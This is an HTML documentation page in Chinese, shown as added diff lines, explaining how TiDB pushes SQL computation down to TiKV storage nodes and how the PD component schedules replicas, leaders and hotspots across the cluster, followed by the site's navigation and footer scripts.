+<h3><a class="anchor" aria-hidden="true" id="sql运算"></a><a href="#sql运算" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQL运算</h3>
+<p>一个查询语句是如何操作底层存储的数据。</p>
+<p>能想到的最简单的方案就是通过上一节所述的映射方案，将SQL查询映射为对KV的查询，再通过KV接口获取对应的数据，最后执行各种计算。比如<em>select
+count(*) from user where
+name=&quot;TiDB&quot;;</em>这样一个语句，我们需要读取表中所有的数据，然后检查Name字段是否是TiDB，如果是的话，则返回这一行。这样一个操作流程转换为KV，操作流程：</p>
+<p>①构造出KeyRange：一个表中所有的RowID都在[0,MaxInt64]这个范围内，那么我们用0和MaxInt64根据Row的Key编码规则，就能构造出一个[StartKey,EndKey]的左闭右开区间。如果tableId为10，key范围[t10_r0,
+t10_rMaxInt64)</p>
+<p>②扫描KeyRange：根据上面构造出的KeyRange，读取TiKV中的数据</p>
+<p>③过滤数据：对于读到的每一行数据，计算name=&quot;TiDB&quot;这个表达式，如果为真，则向上返回这一行，否则丢弃这一行数据</p>
+<p>④计算Count：对符合要求的每一行，累计到Count值上面</p>
+<p>该方案可以工作，但问题显而易见：</p>
+<p>①在扫描数据的时候，每一行都要通过KV操作向TiKV中读取出来，至少有一次RPC开销，如果需要扫描的数据很多，那么这个开销会非常大</p>
+<p>②并不是所有的行都有用，如果不满足条件，其实可以不读取出来</p>
+<p>③符合要求的行的值并没有什么意义，实际上这里只需要有几行数据这个信息就行</p>
+<h3><a class="anchor" aria-hidden="true" id="分布式sql运算"></a><a href="#分布式sql运算" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>分布式SQL运算</h3>
+<p>如何避免上述缺陷，首先我们需要将计算尽量靠近存储节点，以避免大量的RPC调用。其次，我们需要将Filter也下推到存储节点进行计算，这样只需要返回有效的行，避免无意义的网络传输。最后，我们可以将聚合函数、GroupBy也下推到存储节点，进行预聚合，每个节点只需要返回一个Count值即可，再由tidb-server将Count值Sum起来。这里有一个数据逐层返回的示意图：</p>
+<p><img src="media/image99.png" alt="">{width=&quot;3.2645833333333334in&quot;
+height=&quot;2.119482720909886in&quot;}</p>
+<p>说的直白一些就是计算逻辑尽量下推，然后再汇总。</p>
+<h2><a class="anchor" aria-hidden="true" id="调度"></a><a href="#调度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>调度</h2>
+<h3><a class="anchor" aria-hidden="true" id="为什么要进行调度"></a><a href="#为什么要进行调度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>为什么要进行调度</h3>
+<p>TiKV集群是TiDB数据库的分布式KV存储引擎，数据以Region为单位进行复制和管理，每个Region会有多个Replica（副本），这些Replica会分布在不同的TiKV节点上，其中Leader负责读/写，Follower负责同步Leader发来的raftlog。</p>
+<p>①如何保证同一个Region的多个Replica分布在不同的节点上？更进一步，如果在一台机器上启动多个TiKV实例，会有什么问题？</p>
+<p>②TiKV集群进行跨机房部署用于容灾的时候，如何保证一个机房掉线，不会丢失RaftGroup的多个Replica？</p>
+<p>③添加一个节点进入TiKV集群之后，如何将集群中其他节点上的数据搬过来?</p>
+<p>④当一个节点掉线时，会出现什么问题？整个集群需要做什么事情？如果节点只是短暂掉线（重启服务），那么如何处理？如果节点是长时间掉线（磁盘故障，数据全部丢失），需要如何处理？</p>
+<p>⑤假设集群需要每个RaftGroup有N个副本，那么对于单个RaftGroup来说，Replica数量可能会不够多（例如节点掉线，失去副本），也可能会过于多（例如掉线的节点又回复正常，自动加入集群）。那么如何调节Replica个数？</p>
+<p>⑥读/写都是通过Leader进行，如果Leader只集中在少量节点上，会对集群有什么影响？</p>
+<p>⑦并不是所有的Region都被频繁的访问，可能访问热点只在少数几个Region，这个时候我们需要做什么？</p>
+<p>⑧集群在做负载均衡的时候，往往需要搬迁数据，这种数据的迁移会不会占用大量的网络带宽、磁盘IO以及CPU？进而影响在线服务？</p>
+<p>这些问题单独拿出可能都能找到简单的解决方案，但是混杂在一起，就不太好解决。有的问题貌似只需要考虑单个RaftGroup内部的情况，比如根据副本数量是否足够多来决定是否需要添加副本。但是实际上这个副本添加在哪里，是需要考虑全局的信息。整个系统也是在动态变化，Region分裂、节点加入、节点失效、访问热点变化等情况会不断发生，整个调度系统也需要在动态中不断向最优状态前进，如果没有一个掌握全局信息，可以对全局进行调度，并且可以配置的组件，就很难满足这些需求。因此我们需要一个中心节点，来对系统的整体状况进行把控和调整，所以有了PD这个模块。</p>
+<h3><a class="anchor" aria-hidden="true" id="调度的需求"></a><a href="#调度的需求" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>调度的需求</h3>
+<p>上面罗列了一大堆问题，我们先进行分类和整理。总体来看，问题有两大类：</p>
+<p>作为一个分布式高可用存储系统，必须满足的需求，包括四种：</p>
+<p>副本数量不能多也不能少</p>
+<p>副本需要分布在不同的机器上</p>
+<p>新加节点后，可以将其他节点上的副本迁移过来</p>
+<p>节点下线后，需要将该节点的数据迁移走</p>
+<p>作为一个良好的分布式系统，需要优化的地方，包括：</p>
+<p>维持整个集群的Leader分布均匀</p>
+<p>维持每个节点的储存容量均匀</p>
+<p>维持访问热点分布均匀</p>
+<p>控制Balance的速度，避免影响在线服务</p>
+<p>管理节点状态，包括手动上线/下线节点，以及自动下线失效节点</p>
+<p>满足第一类需求后，整个系统将具备多副本容错、动态扩容/缩容、容忍节点掉线以及自动错误恢复的功能。满足第二类需求后，可以使得整体系统的负载更加均匀、且可以方便的管理。</p>
+<p>为了满足这些需求，首先我们需要收集足够的信息，比如每个节点的状态、每个RaftGroup的信息、业务访问操作的统计等；其次需要设置一些策略，PD根据这些信息以及调度的策略，制定出尽量满足前面所述需求的调度计划；最后需要一些基本的操作，来完成调度计划。</p>
+<h3><a class="anchor" aria-hidden="true" id="调度的基本操作"></a><a href="#调度的基本操作" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>调度的基本操作</h3>
+<p>上述调度需求看似复杂，但是整理下来最终落地的无非是下面三件事：</p>
+<p>增加一个Replica</p>
+<p>删除一个Replica</p>
+<p>将Leader角色在一个RaftGroup的不同Replica之间transfer</p>
+<p>刚好Raft协议能够满足这三种需求，通过AddReplica、RemoveReplica、TransferLeader这三个命令，可以支撑上述三种基本操作。</p>
+<p><strong>信息收集</strong></p>
+<p>调度依赖于整个集群信息的收集，简单来说，我们需要知道每个TiKV节点的状态以及每个Region的状态。TiKV集群会向PD汇报两类消息：</p>
+<p><strong>每个TiKV节点会定期向PD汇报节点的整体信息</strong></p>
+<p>TiKV节点（Store）与PD之间存在心跳包，一方面PD通过心跳包检测每个Store是否存活，以及是否有新加入的Store；另一方面，心跳包中也会携带这个Store的状态信息，主要包括：</p>
+<p>总磁盘容量、可用磁盘容量、承载的Region数量、数据写入速度、发送/接受的Snapshot数量（Replica之间可能会通过Snapshot同步数据）、是否过载、标签信息（标签是具备层级关系的一系列Tag）</p>
+<p><strong>每个RaftGroup的Leader会定期向PD汇报信息</strong></p>
+<p>每个RaftGroup的Leader和PD之间存在心跳包，用于汇报这个Region的状态，主要包括下面几点信息：</p>
+<p>Leader的位置、Followers的位置、掉线Replica的个数、数据写入/读取的速度</p>
+<p>PD不断的通过这两类心跳消息收集整个集群的信息，再以这些信息作为决策的依据。除此之外，PD还可以通过管理接口接受额外的信息，用来做更准确的决策。比如当某个Store的心跳包中断的时候，PD并不能判断这个节点是临时失效还是永久失效，只能经过一段时间的等待（默认是30分钟），如果一直没有心跳包，就认为是Store已经下线，再决定需要将这个Store上面的Region都调度走。但是有的时候，是运维人员主动将某台机器下线，这个时候，可以通过PD的管理接口通知PD该Store不可用，PD就可以马上判断需要将这个Store上面的Region都调度走。</p>
+<h3><a class="anchor" aria-hidden="true" id="调度的策略"></a><a href="#调度的策略" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>调度的策略</h3>
+<p>PD收集了这些信息后，还需要一些策略来制定具体的调度计划。</p>
+<p><strong>一个Region的Replica数量正确</strong></p>
+<p>当PD通过某个RegionLeader的心跳包发现这个Region的Replica数量不满足要求时，需要通过Add/RemoveReplica操作调整Replica数量。出现这种情况的可能原因是：</p>
+<p>①某个节点掉线，上面的数据全部丢失，导致一些Region的Replica数量不足</p>
+<p>②某个掉线节点又恢复服务，自动接入集群，这样之前已经补足了Replica的Region的Replica数量多过，需要删除某个Replica</p>
+<p>③管理员调整了副本策略，修改了max-replicas的配置</p>
+<p><strong>一个RaftGroup中的多个Replica不在同一个位置</strong></p>
+<p>『一个RaftGroup中的多个Replica不在同一个位置』，这里用的是『同一个位置』而不是『同一个节点』。在一般情况下，PD只会保证多个Replica不落在一个节点上，以避免单个节点失效导致多个Replica丢失。在实际部署中，还可能出现下面这些需求：</p>
+<p>①多个节点部署在同一台物理机器上</p>
+<p>②TiKV节点分布在多个机架上，希望单个机架掉电时，也能保证系统可用性</p>
+<p>③TiKV节点分布在多个IDC中，希望单个机房掉电时，也能保证系统可用</p>
+<p>这些需求本质上都是某一个节点具备共同的位置属性，构成一个最小的容错单元，我们希望这个单元内部不会存在一个Region的多个Replica。这个时候，可以给节点配置lables并且通过在PD上配置location-labels来指明哪些lable是位置标识，需要在Replica分配的时候尽量保证不会有一个Region的多个Replica所在结点有相同的位置标识。</p>
+<p><strong>副本在Store之间的分布均匀分配</strong></p>
+<p>每个副本中存储的数据容量上限是固定的，所以我们维持每个节点上面，副本数量的均衡，会使得总体的负载更均衡。</p>
+<p><strong>Leader数量在Store之间均匀分配</strong></p>
+<p>Raft协议要读取和写入都通过Leader进行，所以计算的负载主要在Leader上面，PD会尽可能将Leader在节点间分散开。</p>
+<p><strong>访问热点数量在Store之间均匀分配</strong></p>
+<p>每个Store以及RegionLeader在上报信息时携带了当前访问负载的信息，比如Key的读取/写入速度。PD会检测出访问热点，且将其在节点之间分散开。</p>
+<p><strong>各个Store的存储空间占用大致相等</strong></p>
+<p>每个Store启动的时候都会指定一个Capacity参数，表明这个Store的存储空间上限，PD在做调度的时候，会考虑节点的存储空间剩余量。</p>
+<p><strong>控制调度速度，避免影响在线服务</strong></p>
+<p>调度操作需要耗费CPU、内存、磁盘IO以及网络带宽，我们需要避免对线上服务造成太大影响。PD会对当前正在进行的操作数量进行控制，默认的速度控制是比较保守的，如果希望加快调度(比如已经停服务升级，增加新节点，希望尽快调度)，那么可以通过pd-ctl手动加快调度速度。</p>
+<p><strong>支持手动下线节点</strong></p>
+<p>当通过pd-ctl手动下线节点后，PD会在一定的速率控制下，将节点上的数据调度走。当调度完成后，就会将这个节点置为下线状态。</p>
+<h3><a class="anchor" aria-hidden="true" id="调度的实现"></a><a href="#调度的实现" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>调度的实现</h3>
+<p>PD不断的通过Store或者Leader的心跳包收集信息，获得整个集群的详细数据，并且根据这些信息以及调度策略生成调度操作序列，每次收到RegionLeader发来的心跳包时，PD都会检查是否有对这个Region待进行的操作，通过心跳包的回复消息，将需要进行的操作返回给RegionLeader，并在后面的心跳包中监测执行结果。注意这里的操作只是给RegionLeader的建议，并不保证一定能得到执行，具体是否会执行以及什么时候执行，由RegionLeader自己根据当前自身状态来定。</p>
+<h1><a class="anchor" aria-hidden="true" id="oracle"></a><a href="#oracle" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Oracle</h1>
+</span></div></article></div><div class="docs-prevnext"></div></div></div><nav class="onPageNav"><ul class="toc-headings"><li><a href="#配置中心设计与实践">配置中心设计与实践</a><ul class="toc-headings"><li><a href="#配置中心定义">配置中心定义</a></li><li><a href="#配置中心目的">配置中心目的</a></li><li><a href="#为什么不采用zk，etcd？">为什么不采用ZK，etcd？</a></li><li><a href="#开源配置中心">开源配置中心</a></li><li><a href="#推荐：携程apollo，配置中心也应该是一个ap模型">推荐：携程Apollo，配置中心也应该是一个AP模型</a></li><li><a href="#自研配置中心">自研配置中心</a></li></ul></li><li><a href="#服务管理平台设计与实践">服务管理平台设计与实践</a></li><li><a href="#智能个性化推荐系统设计与实践">智能个性化推荐系统设计与实践</a></li><li><a href="#智能搜索引擎系统设计与实践">智能搜索引擎系统设计与实践</a></li><li><a href="#千亿级真实案例实践">千亿级真实案例实践</a></li><li><a href="#eurake">Eurake</a></li><li><a href="#etcd">etcd</a></li><li><a href="#consul">Consul</a></li><li><a href="#zookeeper">ZooKeeper</a></li><li><a href="#docker容器技术揭秘">Docker容器技术揭秘</a></li><li><a href="#kubernetes容器管理技术揭秘">Kubernetes容器管理技术揭秘</a></li><li><a href="#大规模容器弹性云平台设计与实践">大规模容器弹性云平台设计与实践</a><ul class="toc-headings"><li><a href="#容器日志收集开源方案">容器日志收集开源方案</a></li><li><a href="#容器登录">容器登录</a></li><li><a href="#网络方案">网络方案</a></li><li><a href="#有状态服务">有状态服务</a></li><li><a href="#弹性伸缩">弹性伸缩</a></li></ul></li><li><a href="#互联网微服务架构痛点">互联网微服务架构痛点</a></li><li><a href="#微服务架构发展方向">微服务架构发展方向</a></li><li><a href="#服务网格架构设计与实践">服务网格架构设计与实践</a></li><li><a href="#架构未来">架构未来</a></li><li><a href="#数据库技术演进之路">数据库技术演进之路</a><ul class="toc-headings"><li><a href="#olap--oltp--htap">OLAP &amp; OLTP &amp; HTAP</a></li></ul></li><li><a href="#传统关系型数据库分库分表实践">传统关系型数据库分库分表实践</a><ul class="toc-headings"><li><a href="#mysql-scale-out">MySQL Scale Out</a></li><li><a href="#mysql-read-and-write-separation">MySQL Read and Write Separation</a></li><li><a href="#mysql-sharding">MySQL Sharding</a></li><li><a href="#mysql-db-proxy">MySQL DB Proxy</a></li><li><a href="#sharding">sharding</a></li><li><a href="#数据库中间件">数据库中间件</a></li></ul></li><li><a href="#传统关系型数据库性能优化全攻略">传统关系型数据库性能优化全攻略</a><ul class="toc-headings"><li><a href="#影响性能的因素">影响性能的因素</a></li><li><a href="#query优化">Query优化</a></li><li><a href="#schema设计优化">Schema设计优化</a></li><li><a href="#索引设计优化">索引设计优化</a></li><li><a href="#锁优化">锁优化</a></li><li><a href="#mysql架构优化">MySQL架构优化</a></li><li><a href="#mysql优化">MySQL优化</a></li><li><a href="#范式和冗余">范式和冗余</a></li></ul></li><li><a href="#传统关系型数据库高可用方案">传统关系型数据库高可用方案</a><ul class="toc-headings"><li><a href="#总体架构">总体架构</a></li><li><a href="#流程">流程</a></li></ul></li><li><a href="#nosql数据库应用实践">NoSQL数据库应用实践</a><ul class="toc-headings"><li><a href="#nosql基础概念">NoSQL基础概念</a></li><li><a href="#mongodb基础概念">MongoDB基础概念</a></li><li><a href="#mongodb数据稳定性-可靠性">MongoDB数据稳定性-可靠性</a></li><li><a href="#mongodb高可用">MongoDB高可用</a></li><li><a href="#mongodb应用场景（对事务一致性要求不高的）">MongoDB应用场景（对事务一致性要求不高的）</a></li><li><a href="#mongodb可扩展存储">MongoDB可扩展存储</a></li></ul></li><li><a href="#newsql数据库应用实践">NewSQL数据库应用实践</a><ul class="toc-headings"><li><a href="#面临的问题">面临的问题</a></li><li><a href="#选择newsql">选择NewSQL</a></li><li><a href="#tidb测试">TiDB测试</a></li><li><a href="#tidb预上线">TiDB预上线</a></li><li><a href="#上线后效果分析">上线后效果分析</a></li></ul></li><li><a href="#数据库数据无缝迁移">数据库数据无缝迁移</a></li><li><a href="#缓存数据一致性实践">缓存数据一致性实践</a></li><li><a href="#缓存热点数据自动发现机制">缓存热点数据自动发现机制</a></li><li><a href="#数据库基础知识">数据库基础知识</a><ul class="toc-headings"><li><a href="#丢失的数据">丢失的数据</a></li><li><a href="#脏数据-读取未提交的数据（read-uncommitted）">脏数据-读取未提交的数据（Read Uncommitted）</a></li><li><a href="#不可重复读">不可重复读</a></li><li><a href="#幻读">幻读</a></li><li><a href="#事务的隔离级别">事务的隔离级别</a></li><li><a href="#多版本并发控制">多版本并发控制</a></li></ul></li><li><a href="#sharding-jdbc">Sharding-JDBC</a></li><li><a href="#mysql">MySQL</a><ul class="toc-headings"><li><a href="#gtid">GTID</a></li></ul></li><li><a href="#titan">Titan</a></li><li><a href="#pika">Pika</a></li><li><a href="#fastdfs">Fastdfs</a></li><li><a href="#elasticsearch">Elasticsearch</a></li><li><a href="#google-guava-cache">Google Guava Cache</a></li><li><a href="#服务治理数据采集方法">服务治理数据采集方法</a></li><li><a href="#传统服务监控手段">传统服务监控手段</a></li><li><a href="#进程监控">进程监控</a></li><li><a href="#语义监控">语义监控</a></li><li><a href="#错误日志监控">错误日志监控</a></li><li><a href="#数据波动监控">数据波动监控</a></li><li><a href="#机器资源监控">机器资源监控</a></li><li><a href="#优秀开源监控框架">优秀开源监控框架</a></li><li><a href="#立体监控解决问题">立体监控解决问题</a></li><li><a href="#立体监控设计与实践">立体监控设计与实践</a><ul class="toc-headings"><li><a href="#设计要点">设计要点</a></li><li><a href="#业务接入">业务接入</a></li></ul></li><li><a href="#推送系统总体设计与详细设计">推送系统总体设计与详细设计</a></li><li><a href="#空间用户体系总体设计">空间用户体系总体设计</a></li><li><a href="#开发框架选择">开发框架选择</a></li><li><a href="#web框架spring-boot实践">Web框架Spring Boot实践</a></li><li><a href="#rpc框架实践">RPC框架实践</a></li><li><a href="#安全专题篇">安全专题篇</a></li><li><a href="#服务治理存储专题篇">服务治理存储专题篇</a></li><li><a href="#面试专题篇">面试专题篇</a></li><li><a href="#其它">其它</a></li><li><a href="#xss跨站脚本工具漏洞">XSS跨站脚本工具漏洞</a></li><li><a href="#csrf跨站请求伪造【中风险】">CSRF跨站请求伪造【中风险】</a></li><li><a href="#sql注入">SQL注入</a></li><li><a href="#拒绝服务攻击">拒绝服务攻击</a><ul class="toc-headings"><li><a href="#dos攻击">DOS攻击</a></li><li><a href="#ddos">DDoS</a></li></ul></li><li><a href="#中间件程序版本信息泄漏【低风险】">中间件程序版本信息泄漏【低风险】</a><ul class="toc-headings"><li><a href="#未设置统一的错误提示页">未设置统一的错误提示页</a></li><li><a href="#response-headers中的server信息暴露了中间件的版本">Response Headers中的Server信息暴露了中间件的版本</a></li></ul></li><li><a href="#jquery版本泄露">jQuery版本泄露</a></li><li><a href="#越权访问【中风险】">越权访问【中风险】</a></li><li><a href="#系统无超时退出功能【低风险】">系统无超时退出功能【低风险】</a></li><li><a href="#敏感信息泄露">敏感信息泄露</a><ul class="toc-headings"><li><a href="#html注释中敏感信息泄露">HTML注释中敏感信息泄露</a></li><li><a href="#和外界系统交互时未加密造成敏感信息泄露">和外界系统交互时未加密造成敏感信息泄露</a></li></ul></li><li><a href="#敏感信息未模糊化【高风险】">敏感信息未模糊化【高风险】</a></li><li><a href="#应用程序未容错【中风险】">应用程序未容错【中风险】</a></li><li><a href="#目录遍历漏洞">目录遍历漏洞</a></li><li><a href="#会话cookie中缺少httponly属性【低风险】">会话cookie中缺少HttpOnly属性【低风险】</a></li><li><a href="#浏览器关闭后会话依然可用">浏览器关闭后会话依然可用</a></li><li><a href="#短信炸弹【高风险】">短信炸弹【高风险】</a></li><li><a href="#内部ip信息泄露【中风险】">内部IP信息泄露【中风险】</a></li><li><a href="#图形验证码可重复使用【高风险】">图形验证码可重复使用【高风险】</a></li><li><a href="#http主机头攻击【高风险】">HTTP主机头攻击【高风险】</a></li><li><a href="#zookeeperrediselasticsearch未授权访问">ZooKeeper/Redis/Elasticsearch未授权访问</a></li><li><a href="#枚举漏洞【高风险】">枚举漏洞【高风险】</a></li><li><a href="#任意文件上传漏洞">任意文件上传漏洞</a></li><li><a href="#任意文件读取">任意文件读取</a></li><li><a href="#jdwp远程命令执行【中风险】">JDWP远程命令执行【中风险】</a></li><li><a href="#未限制用户可输入的长度">未限制用户可输入的长度</a></li><li><a href="#使用了不安全的http方法">使用了不安全的HTTP方法</a></li><li><a href="#输入数据验证逻辑漏洞">输入数据验证逻辑漏洞</a></li><li><a href="#技术人员发展之道">技术人员发展之道</a></li><li><a href="#架构师高度">架构师高度</a></li><li><a href="#价值评价核心准则">价值评价核心准则</a></li><li><a href="#技术第一生产力">技术第一生产力</a></li><li><a href="#技术管理者视野">技术管理者视野</a></li><li><a href="#专业决定高度">专业决定高度</a></li><li><a href="#团队如何知人">团队如何知人</a></li><li><a href="#以己为尺度">以己为尺度</a></li><li><a href="#架构师的自我修炼">架构师的自我修炼</a></li><li><a href="#格局重要性">格局重要性</a></li><li><a href="#培养大格局大局观">培养大格局大局观</a></li><li><a href="#数据存储">数据存储</a><ul class="toc-headings"><li><a href="#数据丢失？">数据丢失？</a></li><li><a href="#key-value：数据存储模型">Key-Value：数据存储模型</a></li><li><a href="#rocksdb：存储引擎">RocksDB：存储引擎</a></li><li><a href="#解决单机失效问题：raft">解决单机失效问题：Raft</a></li><li><a href="#数据多版本控制（mvcc）">数据多版本控制（MVCC）</a></li><li><a href="#事务">事务</a></li></ul></li><li><a href="#计算">计算</a><ul class="toc-headings"><li><a href="#关系模型到key-value模型的映射">关系模型到Key-Value模型的映射</a></li><li><a href="#整体的需求描述">整体的需求描述</a></li><li><a href="#tidb如何实现">TiDB如何实现</a></li><li><a href="#元信息管理">元信息管理</a></li><li><a href="#sql运算">SQL运算</a></li><li><a href="#分布式sql运算">分布式SQL运算</a></li></ul></li><li><a href="#调度">调度</a><ul class="toc-headings"><li><a href="#为什么要进行调度">为什么要进行调度</a></li><li><a href="#调度的需求">调度的需求</a></li><li><a href="#调度的基本操作">调度的基本操作</a></li><li><a href="#调度的策略">调度的策略</a></li><li><a href="#调度的实现">调度的实现</a></li></ul></li></ul></nav></div><footer class="nav-footer" id="footer"><section class="copyright">Copyright © 2020</section></footer></div><script type="text/javascript" src="https://cdn.jsdelivr.net/docsearch.js/1/docsearch.min.js"></script><script>
+                document.addEventListener('keyup', function(e) {
+                  if (e.target !== document.body) {
+                    return;
+                  }
+                  // keyCode for '/' (slash)
+                  if (e.keyCode === 191) {
+                    const search = document.getElementById('search_input_react');
+                    search && search.focus();
+                  }
+                });
+              </script><script>
+              var search = docsearch({
+                
+                apiKey: 'my-search-only-api-key-1234',
+                indexName: 'my-index-name',
+                inputSelector: '#search_input_react'
+              });
+            </script></body></html>
